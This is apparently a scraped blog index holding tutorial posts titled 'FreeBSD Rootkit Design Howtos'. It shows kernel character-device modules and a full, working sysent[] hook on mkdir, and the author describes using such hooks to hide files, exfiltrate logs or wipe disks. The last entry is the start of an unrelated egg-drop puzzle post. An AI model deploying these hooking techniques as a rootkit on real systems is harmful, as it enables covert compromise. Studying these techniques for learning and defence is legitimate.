– we have to explicitly define a cdev structure to receive the return value of the make_dev() function, since we’ll need to use it for our destroy_dev() function. The destroy_dev() function is defined in sys/conf.h as shown below,   FILE:/usr/src/sys/sys/conf.h void    destroy_dev(struct cdev *_dev);   This is superb simple, the destroy_dev() function will unregister the module and remove the device file in /dev, so it needs the cdev structure we just got from make_dev() function to get the module’s devfs information in order to destroy the device successfully.   Thus, we can update our example as the following,   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  int read(struct cdev *dev, struct uio *uio, int ioflag) {     uprintf(\"Read function called!n\"); }  /* Event Handler Code Here... */ ... static struct cdev *sdev; sdev = make_dev(&amp;ro_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example_ro\"); destroy_dev(sdev); ...  /* Declaration Macro Here... */ DEV_MODULE(...)   In the above example, we set the owner of the device to root, owner group to wheel, and permissions to 0600. A complete list of USER_IDs and GROUP_IDs are defined in sys/conf.h   FILE:/usr/src/sys/sys/conf.h #define         UID_ROOT        0 #define         UID_BIN         3 #define         UID_UUCP        66 #define         UID_NOBODY      65534  #define         GID_WHEEL       0 #define         GID_KMEM        2 #define         GID_TTY         4 #define         GID_OPERATOR    5 #define         GID_BIN         7 #define         GID_GAMES       13 #define         GID_DIALER      68 #define         GID_NOBODY      65534   DEV_MODULE macro   Here comes the last part of the device registration routine, the declaration macro. The definition of DEV_MODULE macro is in sys/conf.h as shown below,   FILE:/usr/src/sys/sys/conf.h #define DEV_MODULE(name, evh, arg)                                      \\ static moduledata_t name##_mod = {                                      \\     #name,                                                              \\     evh,                                                                \\     arg                                                                 \\ };                                                                      \\ DECLARE_MODULE(name, name##_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE)   Notice that when we use DEV_MODULE, it will automatically call the general DECLARE_MODULE with default module type and SI_SUB_DRIVERS, and the module position will be somewhere in the middle. So all we need to do is to specify the general name, the event handler function pointer, that’s all.   Connecting the dots   Now let’s connect all the pieces of code together to see how a character device register routine looks like.   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;     if (len &lt;= 0)         error = -1;     else     /* Return the saved character string to userland. */         copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len);      return(error); }  /* Reference to the device in DEVFS */ static struct cdev *sdev;  static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd)     {         case MOD_LOAD:         sdev = make_dev(&amp;ro_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example_ro\");         uprintf(\"Character device loaded.n\"); break;          case MOD_UNLOAD: destroy_dev(sdev);         uprintf(\"Character device unloaded.n\"); break;          default: error = EOPNOTSUPP;         break;     }      return(error); }  DEV_MODULE(cd_example_ro, load, NULL);          #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/conf.h&gt; #include &lt;sys/uio.h&gt;  // Function prototypes d_open_t open; d_close_t close; d_read_t read; d_write_t write;  static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write,     .d_name =\"cd_example\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int open(struct cdev *dev, int flag, int otyp, struct thread *td) { /* Initialize character buffer. */ memset(&amp;buf, '�', 513); len = 0;  return(0); }  int close(struct cdev *dev, int flag, int otyp, struct thread *td) { return(0); }  int write(struct cdev *dev, struct uio *uio, int ioflag) { int error = 0;  /* * Take in a character string, saving it in buf. * Note: The proper way to transfer data between buffers and I/O * vectors that cross the user/kernel space boundary is with * uiomove(), but this way is shorter. For more on device driver I/O * routines, see the uio(9) manual page. */ error = copyinstr(uio-&gt;uio_iov-&gt;iov_base, &amp;buf, 512, &amp;len); if (error != 0) uprintf(\"Write to \"cd_example\" failed.n\");  return(error); }  int read(struct cdev *dev, struct uio *uio, int ioflag) { int error = 0;  if (lenuio_iov-&gt;iov_base, 513, &amp;len);  return(error); }  /* Reference to the device in DEVFS */ static struct cdev *sdev;  static int load(struct module *module, int cmd, void *arg) { int error = 0;  switch (cmd) { case MOD_LOAD: sdev = make_dev(&amp;cd_example_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example\"); uprintf(\"Character device loaded.n\"); break;  case MOD_UNLOAD: destroy_dev(sdev); uprintf(\"Character device unloaded.n\"); break;  default: error = EOPNOTSUPP; break; }  return(error); }  DEV_MODULE(cd_example, load, NULL);   The Implementation   Have discussed all these, we are now ready to look at the example code from the book.   #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/conf.h&gt; #include &lt;sys/uio.h&gt;  // Function prototypes d_open_t open; d_close_t close; d_read_t read; d_write_t write;  static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write,     .d_name =\"cd_example\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int open(struct cdev *dev, int flag, int otyp, struct thread *td) {     /* Initialize character buffer. */     memset(&amp;buf, '�', 513);     len = 0;      return(0); }  int close(struct cdev *dev, int flag, int otyp, struct thread *td) {     return(0); }  int write(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;       /*      * Take in a character string, saving it in buf.      * Note: The proper way to transfer data between buffers and I/O      * vectors that cross the user/kernel space boundary is with      * uiomove(), but this way is shorter. For more on device driver I/O      * routines, see the uio(9) manual page.     */     error = copyinstr(uio-&gt;uio_iov-&gt;iov_base, &amp;buf, 512, &amp;len);     if (error != 0)         uprintf(\"Write to \"cd_example\" failed.n\");      return(error); }  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;      if (len &lt;= 0)         error = -1;     else         /* Return the saved character string to userland. */         copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len);      return(error); }  /* Reference to the device in DEVFS */ static struct cdev *sdev;  static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd)     {         case MOD_LOAD:             sdev = make_dev(&amp;cd_example_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example\");             uprintf(\"Character device loaded.n\");             break;          case MOD_UNLOAD:             destroy_dev(sdev);             uprintf(\"Character device unloaded.n\");             break;          default:             error = EOPNOTSUPP;             break;     }      return(error); }  DEV_MODULE(cd_example, load, NULL);   Now compile and try to load it into kernel.   ZFSTest# make Warning: Object directory not changed from original /zroot/development/3.Character_device cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c cdev.c ld  -d -warn-common -r -d -o cd_example.ko cdev.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk cd_example.ko  export_syms | xargs -J% objcopy % cd_example.ko objcopy --strip-debug cd_example.ko ZFSTest# kldload ./cd_example.ko Character device loaded.   Now we can see that the module is successfully loaded to the kernel. And if you check the /dev folder now, you can find your very first own DEVFS file.   ZFSTest# ls -lF /dev/cd_example crw-------  1 root  wheel    0,  96 Apr 13 10:23 /dev/cd_example   All right then, this should be all for today. We’ll talk about how to call our character device from user space with an application in the next note, see you then.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-5-character-device-first-cdev-module/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 6 - Character Device First cdev Application",
        "excerpt":"This is a refined version using uiomove() instead of copystr(). It surprised me when I found out how easy it was to use uiomove() function. Anyway, I made the change, along with some debug messages to make the result more descriptive, so let’s take a look at the refined code and compile it first.   #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/conf.h&gt; #include &lt;sys/uio.h&gt;  // Function prototypes d_open_t open; d_close_t close; d_read_t read; d_write_t write;  static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write,     .d_name =\"cd_example\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int open(struct cdev *dev, int flag, int otyp, struct thread *td) {     /* Initialize character buffer. */     memset(&amp;buf, '�', 513);     len = 0;     printf(\"[cd_example]Open Called!n\");      return(0); }  int close(struct cdev *dev, int flag, int otyp, struct thread *td) {     printf(\"[cd_example]Close Called!n\");     return(0); }  int write(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;      error = copyinstr(uio-&gt;uio_iov-&gt;iov_base, &amp;buf, 512, &amp;len);     if (error != 0)         printf(\"[cd_example]Write to \"cd_example\" failed.n\");     else         printf(\"[cd_example]Write Called! String is:%sn\", buf);      return(error); }  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;      if (len &lt;= 0) {         printf(\"[cd_example]Read Called! ERROR: Length is invalid!n\");         error = -1;     }      else {         /* Return the saved character string to userland. */     uiomove(&amp;buf, 513, uio);     printf(\"[cd_example]Read Called! String is:%sn\", buf);     }      return(error); }  /* Reference to the device in DEVFS */ static struct cdev *sdev;  static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd)     {         case MOD_LOAD:             sdev = make_dev(&amp;cd_example_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example\");             uprintf(\"Character device loaded.n\");             break;          case MOD_UNLOAD:             destroy_dev(sdev);             uprintf(\"Character device unloaded.n\");             break;          default:             error = EOPNOTSUPP;             break;     }      return(error); }  DEV_MODULE(cd_example, load, NULL);   Nothing much changed except uiomove(&amp;buf, 513, uio); part.   ZFSTest# make Warning: Object directory not changed from original /zroot/development/3.Character_device cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c cdev.c ld  -d -warn-common -r -d -o cd_example.ko cdev.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk cd_example.ko  export_syms | xargs -J% objcopy % cd_example.ko objcopy --strip-debug cd_example.ko ZFSTest# kldload ./cd_example.ko Character device loaded.   The Application   Same as the relationship between system call and its application, you can consider this as C/S model, one service, one client. There’s nothing tricky in this client application code, except that we used a file descriptor to open our device interface under DEVFS, and write(), read(), open(), close() functions to interact with it.   #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; //Add this to avoid warning #include &lt;fcntl.h&gt; #include &lt;paths.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt;  #define CDEV_DEVICE \"cd_example\" static char buf[512+1];  int main(int argc, char*argv[]) {     if (argc != 2) {         printf(\"Usage:n%s &lt;string&gt;n\", argv[0]);         exit(0);     }      int kernel_fd; //Kernel File Descriptor     int len;      /* Open cd_example. */     if ((kernel_fd = open(\"/dev/\" CDEV_DEVICE, O_RDWR)) == -1) {         perror(\"/dev/\" CDEV_DEVICE); exit(1);     }      if ((len = strlen(argv[1]) + 1) &gt; 512) {         printf(\"ERROR: String too longn\"); exit(0);     }      /* Write to cd_example. */     if (write(kernel_fd, argv[1], len) == -1)         perror(\"write()\");     else         printf(\"Wrote \"%s\" to device /dev/\" CDEV_DEVICE \".n\", argv[1]);      /* Read from cd_example. */     if (read(kernel_fd, buf, len) == -1)         perror(\"read()\");     else         printf(\"Read \"%s\" from device /dev/\" CDEV_DEVICE \".n\", buf);      /* Close cd_example. */     if ((close(kernel_fd)) == -1) {         perror(\"close()\");         exit(1);     }      exit(0); }   ZFSTest# gcc -o testcdev testcdev.c ZFSTest# ./testcdev Having fun with cdev Wrote \"Having fun with cdev\" to device /dev/cd_example. Read \"Having fun with cdev\" from device /dev/cd_example. ZFSTest# dmesg | tail -n 5 --- syscall (5, FreeBSD ELF64, open), rip = 0x800732abc, rsp = 0x7ffffffbc058, rbp = 0x7ffffffe6089 --- [cd_example]Open Called! [cd_example]Write Called! String is:Having fun with cdev [cd_example]Read Called! String is:Having fun with cdev [cd_example]Close Called! ZFSTest#   Pretty straightforward code, so let’s keep this note simple. Let’s jump right into the next note, see you there!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-6-character-device-first-cdev-application/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 7 - Linker Files and Chapter Summary",
        "excerpt":"The book allocated a short section to describe the kldstat command once more before it ends the first chapter. So I’ll do this as well but with a little more information.   Linker Files   As we already know, that the kldstat command can give us a whole list of all loaded modules with their id, address, size, and module name. This is a simple and powerful tool for sysadmins, developers, and all kinds of other users, except that this might not be a lovely tool for rootkit developers (or let’s say low-level rootkit developers), ’cause people can easily detect your rootkit with only one command. But you know what, don’t you be worried, there are a whole bunch of techniques that the book will tell us to avoid your rootkit being listed in that list.   Let’s take a look at the manual page of kldstat.        kldstat [-v] [-i id] [-n filename]      kldstat [-q] [-m modname] ....  DESCRIPTION      The kldstat utility displays the status of any files dynamically linked      into the kernel.       The following options are available:       -v        Be more verbose.       -i id     Display the status of only the file with this ID.       -n filename                Display the status of only the file with this filename.       -q        Only check if module is loaded or compiled into the kernel.       -m modname                Display the status of only the module with this modname.   Let’s see some examples.   ZFSTest# kldstat -v  1   22 0xffffffff80100000 cfc488   kernel (/boot/kernel/kernel)     Contains modules:         230 nfs         235 ufs          1 cam         50 ata         10 pass          4 pmp ... ...   2    1 0xffffffff81012000 169d25   zfs.ko (/boot/kernel/zfs.ko)     Contains modules:         Id Name         285 zfsctrl         286 zfs         288 zfs_vdev         287 zfs_zvol  3    1 0xffffffff8117c000 20f7     opensolaris.ko (/boot/kernel/opensolaris.ko)     Contains modules:         Id Name         284 opensolaris  4    1 0xffffffff8117f000 4050     linprocfs.ko (/boot/kernel/linprocfs.ko)     Contains modules:         Id Name         290 linprocfs  5    1 0xffffffff81184000 1dd6d    linux.ko (/boot/kernel/linux.ko)     Contains modules:         Id Name         289 linuxelf  6    1 0xffffffff811a2000 67e      cd_example.ko (./cd_example.ko)     Contains modules:         Id Name         291 cd_example   ZFSTest# kldstat -v -i 6 Id Refs Address            Size     Name  6    1 0xffffffff811a2000 67e      cd_example.ko (./cd_example.ko)     Contains modules:         Id Name         291 cd_example   ZFSTest# kldstat -m cd_example Id  Refs Name 291    1 cd_example   ZFSTest# kldstat -n cd_example.ko Id Refs Address            Size     Name  6    1 0xffffffff811a2000 67e      cd_example.ko    Notice the Contains modules output, which can be considered as the kernel module’s submodules. So here is the perfect oppoturnity to introduce linker files.           Let’s use zfs.ko as an example. The module file, zfs.ko, is actually the linker file for ZFS module and guides the module to be registered and linked with the kernel.            So that the parameters for kldload and kldunload are actually linker file names, NOT the module itself.            Submodules like zfsctrl is considered as the module, not a linker file anymore (Once it gets linked with kernel)            As such, every module is associated with one linker file, and one linker file can contain one or more than one module(s).       It is quite common to divide functionalities into different modules and use one linker file to register them with the kernel, we will discuss this later on.   Chapter Summary   Let’s take a look back to what we have learned in the first chapter, and list down all important points that are crucial to continue our discussions. Here’s a list of all the notes we have for the first chapter.   FreeBSD Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module.           We started with the generic KLD with a simple ‘hello world!’ printing module,            and learned the concept of event handler using modeventhand_t(sys/module.h) with modeventtype(sys/module.h) provided,            and finally the the method to declare our module with DECLARE_MODULE(sys/module.h) with moduledata(sys/module.h), order(sys/kernel.h), and sub(sys/kernel.h) as parameters.       FreeBSD Rootkit Design Howtos - 2 - System Call First Kernel Service Module.           And then we started with system calls.            We get sy_call_t(sys/sysent.h) as system call function prototype,            and the SYSCALL_MODULE macro to register the module with            name, the general name for the module            offset(sys/sys/sysent.h), the offset of the system call’s sysent structure.            new_sysent(sys/sys/sysent.h), the sysent pointer to the complete sysent structure for the system call module.            evh, the event handler            and arg, the arguments            a sysent(sys/sysent.h) structure contains at least the number of arguments, and the function pointer to the implementation function.       FreeBSD Rootkit Design Howtos - 3 - System Call First Kernel Service Application.           Then we started with the application side of system call programming, which can be used to call the kernel service,            Firstly we need to find the module id with modfind(sys/module.h) function,            We can then get the module_stat(sys/module.h) back once we have the module id,            The module_stat(sys/module.h) structure contains a modspecific_t(sys/module.h), namely moduledata,            The intval is then retrieved from modspecific_t(sys/module.h) structure as the module offset value,            Then we can issue a syscall function with module offset value specified to call the kernel service.       FreeBSD Rootkit Design Howtos - 4 - Kernel and User Space Transitions.   -&gt;We learned 4 new functions which are defined in sys/systm.h, copyin(), copyout(), copyinstr(), and copystr().   -&gt;They can all be used to copy data from a continuous memory address to another,   -&gt;And all but copystr() copy data from user-space to kernel-space or vice-versa.   -&gt;These functions (except copystr()) are designed to copy data between user-space and kernel-space safely.   -&gt;Directly use reference to user-space at kernel-space or vice-versa is dangerous.   FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module.           A new kernel module is introduced here, the character device module, it looks similar but not a system call module.            A cdevsw(sys/conf.h) known as character device switch table is needed when program a character device.            The cdevsw contains all basic info such as name and version, and also supported functions like open, read, and write.            The present of d_version, and d_name is a minimal requirement for a cdevsw structure.            A bunch of useful function prototypes are defined in sys/conf.h such as d_open_t(), d_close_t(), d_read_t(), and so on.            A cdev(sys/conf.h) structure is required to register the device module with kernel            make_dev(sys/conf.h) and destroy_dev(sys/conf.h) are used to register or unregister the module with cdev as reference.            The DEV_MODULE(sys/conf.h) Macro is then used to register the character device module with kernel.       FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module.           This is rather a simple note,            We started with a refined version of previous character device module program by using copyinstr() instead of copystr() to make a safer transaction between kernel-space and user-space.            And then a client application to interact with character device is introduced.            open(), read(), write(), and close() were used to manipulate the character device module.       All right, this is pretty much everything we’ve covered in Chapter 1, so if any of these terms look strange to you, please do not hesitate to go back and review the note.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-7-linker-files-and-chapter-summary/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 8 - System Call Hook and mkdir_hook Example",
        "excerpt":"We should all agree with the simplicity of the first chapter at this point, there are only few new APIs and concepts, all we did was following the book, the manual pages, or the examples. So if I tell you that we can write real rootkits starting from this chapter, you’d probably not believe me, but that is true. All we need is a little push to the by far most common, most famous, and most popular rootkit technique – the Hooking, since we already have all basic knowledge required for this.   Hooking   As I said, the Hooking technique might be one of the oldest and most widely spread rootkit techniques. The concept of hook is easy, we program and install a kernel module, and let that module pretends to be another system module to change the routine of an execution of a command.   It is rather a simple but efficient technique, all we have to do is to change the routine of an system execution, so that we can change the execution results, add functionalities, and also deduct functionalities if we want. So if you intend to write rootkits, then Hooking is for sure the simplest and most efficient technique to use. For example, we can hide file contents, hide directory, hide network connections by hooking those function calls and change the way how they display the results.      The above figure shows the process of how to hijack a list directory call and hide file(s) from displaying. The original process should be triggered by a ls command, where the testDirectory is the parameter here. The the list directory call will use the parameter to read the list of items under that directory and eventually display all of them one by one.   To hijack the execution process the system call, register itself as the new list directory call, read the list of items under that directory and check Is the Item Hidden (by filename, or by contents, you decide the checking mechanism), and then display those are not hidden by calling the original system call, and everything will be working normally by the end except that we have hiden our secret files.   So you can see that the power of Hooking is only limited by your imagination. You can hide files, hide network connections, temper user list results, have the infected host uploading all it’s logs when it initializes a HTTP request, or delete the entire filesystem on your birthday to have some malicous fun.   Once we get to know how to program a Hooking, we can start writing our first rootkit. That is what I’m gonna do in this chapter, unlike the first chapter, we are not going to learn a lot of APIs, instead, we’ll see lots of examples(from the book, or by myself) to show the real power of Hooking.   Okay, enough talk, lets start with a mkdir_hook example.   The mkdir_hook Example   Manipulate sysent[] Table   As we have discussed previously, sysent[] is a table holding every registered system call’s sysent structure. The hooking technique is based on tempering the sysent[] table, so let’s review this a little bit.   FILE:/usr/src/sys/sys/sysent.h  struct sysent {                 /* system call table */         int     sy_narg;        /* number of arguments */         sy_call_t *sy_call;     /* implementing function */         au_event_t sy_auevent;  /* audit event associated with syscall */         systrace_args_func_t sy_systrace_args_func;                                 /* optional argument conversion function. */         u_int32_t sy_entry;     /* DTrace entry ID for systrace. */         u_int32_t sy_return;    /* DTrace return ID for systrace. */         u_int32_t sy_flags;     /* General flags for system calls. */         u_int32_t sy_thrcnt; };  ...  extern struct sysent sysent[];   The process is we create sysent structure for our system calls, put basic information like number of arguments and implementation functions in it, and register our system call with sysent[] table. See example code below.   ... ...  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args; ... ... }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,  /* number of arguments */     sc_example  /* implementing function */ };  ... ...  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   In the example above, we created sc_example_sysent sysent structure, and specified the number of arguments and implementation function pointer to that structure, and use it as a parameter for SYSCALL_MODULE declaration macro.   So if we want to change the execution routine of mkdir, and register our own module as mkdir in sysent[] table, all we have to to is to get the sysent offset of mkdir, and change the sy_call to our own implementation function pointer. Sample code should look like this:   ... /* The system call's arguments. */ struct mkdir_hook_args {     ...  };  /* mkdir system call hook */ static int mkdir_hook(struct thread *td, void *syscall_args) {     ... }  /* The sysent for the new system call */ static struct sysent mkdir_hook_sysent = {     ...     mkdir_hook  /* implementing function */ };  sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir_hook;   And to undo the changing to sysent[] table, we just need to   sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir;   For general system calls, such as mkdir, we can get a list of constant offsets of them in sys/syscall.h   FILE:/usr/src/sys/sys/syscall.h  ... #define SYS_rename      128                                 /* 129 is old truncate */                                 /* 130 is old ftruncate */ #define SYS_flock       131 #define SYS_mkfifo      132 #define SYS_sendto      133 #define SYS_shutdown    134 #define SYS_socketpair  135 #define SYS_mkdir       136 #define SYS_rmdir       137 #define SYS_utimes      138                                 /* 139 is obsolete 4.2 sigreturn */ ... ...   Be sure to take a look at that list, there are so many fun system calls we can abuse. :-p   The Implementation   The example code from the book won’t complie, here’s my revised version.   #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; //New #include &lt;sys/systm.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct mkdir_hook_args {     char *path;     int mode; };  /* mkdir system call hook */ static int mkdir_hook(struct thread *td, void *syscall_args) {     struct mkdir_hook_args *uap;     uap = (struct mkdir_hook_args *)syscall_args;      char path[255];     size_t done;     int error;      error = copyinstr(uap-&gt;path, path, 255, &amp;done);     if (error!=0)         return(error);      /* print a debug message */     uprintf(\"The directory \"%s\" will be created with the following permissions: %on\", path, uap-&gt;mode);      return (mkdir(td, syscall_args)); }  /* The sysent for the new system call */ static struct sysent mkdir_hook_sysent = {     2,          /* number of arguments */     mkdir_hook  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd) {         case MOD_LOAD:             /* Replace mkdir with mkdir_hook. */             sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;             uprintf(\"The mkdir_hook is loaded, you can try to mkdir now.n\");             break;          case MOD_UNLOAD:             /* Change everything back to normal. */             sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;             uprintf(\"The mkdir_hook is unloaded, everything is back to normal now.n\");             break;          default:             error = EOPNOTSUPP;             break;     }      return(error); }  SYSCALL_MODULE(mkdir_hook, &amp;offset, &amp;mkdir_hook_sysent, load, NULL);   This is nothing just a normal system call, we have mkdir_hook_args to receive arguments, we have mkdir_hook as implementation function, mkdir_hook_sysent as sysent structure, load as event handler and finally use SYSCALL_MODULE to declare the system call.   What this system call does is to change sysent[] table, set mkdir_hook as the implementation function of SYS_mkdir when this module loads, and set it back to normal when it unloads (Otherwise mkdir call will not work once our module is unloaded from the kernel). And we receive arguments of the path and mode of the directory to be created from user space, copy path to kernel space using copyinstr(), display a simple debug message, and then pass the thread td and system arguments(contains path and mode) syscall_args to a normal mkdir call to complete the request.   The Load and Call   Save this make file in the same directory as the source.   KMOD=   mkdir_hook SRCS=   mkdir_hook.c  .include &lt;bsd.kmod.mk&gt;    ZFSTest# make clean rm -f export_syms mkdir_hook.ko mkdir_hook.kld mkdir_hook.o ZFSTest# make Warning: Object directory not changed from original /zroot/development/4.Hooks cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c mkdir_hook.c ld  -d -warn-common -r -d -o mkdir_hook.ko mkdir_hook.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk mkdir_hook.ko  export_syms | xargs -J% objcopy % mkdir_hook.ko objcopy --strip-debug mkdir_hook.ko   ZFSTest# kldload ./mkdir_hook.ko The mkdir_hook is loaded, you can try to mkdir now.  ZFSTest# mkdir test The directory \"test\" will be created with the following permissions: 777  ZFSTest# kldunload mkdir_hook.ko The mkdir_hook is unloaded, everything is back to normal now.  ZFSTest# mkdir test ZFSTest#   As you can see, once we register our module with the kernel, a debug message displays every time the user tries to create a new directory. This may not be exiciting, but serves it’s purpose as a POC. You can edit the code and have it only create the folder when the supplied name starts with ‘awesome’ if you are keen for some hands-on practice.   This is the end of today’s session, We will get to know the general process to writing a semi-working Rootkit on next note, stay tuned!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-8-hook-system-call-hook-and-mkdir-hook-example/",
        "teaser":null},{
        "title": "2 Eggs versus 100 Floor",
        "excerpt":"I saw this problem posted on Facebook today, and find it really intriguing and quite enjoyable to solve.   The problem is described as follow:           You are given 2 eggs.     You have access to a 100-storey building.     Eggs can be very hard or very fragile means it may break if dropped from the first floor or may not even break if dropped from 100 th floor.Both eggs are identical.     You need to figure out the highest floor of a 100-storey building an egg can be dropped without breaking.     Now the question is how many drops you need to make. You are allowed to break 2 eggs in the process      The following methods, codes, and algorithms are all from a pure computer   student’s point of view, I know some people can directly solve the problem   without writing any code, but that’s no fun, is it?   Understand the question  Let’s take a rough look at the question first. Given that these two eggs are identical, the hardness of these two eggs are equally the same, which means that   hardness(egg1) = hardness(egg2)  highest_breaking_floor(egg1) = highest_breaking_floor(egg2)   I’m quite tempted to use binary search, drop the first egg at 50th floor, we will then have two possible consequences           Egg1 breaks       This means the highest floor the egg doesn’t break is less than 50, or 1-49th.          Egg1 did not break       And this means the highest floor the egg can bear to be dropped down from is greater than 50, 51-100th.    This seems to be a very straight forward solution to find out the answer, either one of these two situations will require a linear search to find out the real answer. This is a general solution to solve the problem, but the performance of total tries are questionable.   The General Solution  In order to better understand how this approach works, let’s look at the following pseudocode and flowchart.   DROP egg1 AT 50th FLOOR  IF egg1.break == TRUE:     FOR answer=1, answer&lt;=49,answer++         DROP egg2 AT answer FLOOR         IF egg2.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK  ELSE:     FOR answer=51, answer&lt;=100,answer++         DROP egg1 AT answer FLOOR         IF egg1.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK      Well, let’s admit it, this is, as the name suggests, a very basic and general solution. But before we try to figure out better algorithms, let’s look at this general solution a little bit closer.   We all know that under most context, a binary search is almost definitely better than a linear search, then why don’t we keep performing it and instead utilized linear search after the first try?   Imagine if we broke the first egg at 50th floor, and wants to continue binary search, then the next floor to try would be 25th floor. Now if the second egg breaks at 25th floor, or any other subsequent binary search tries, there would be no egg left to find out the exact answer.   However if the first egg does not break when dropped from 50th 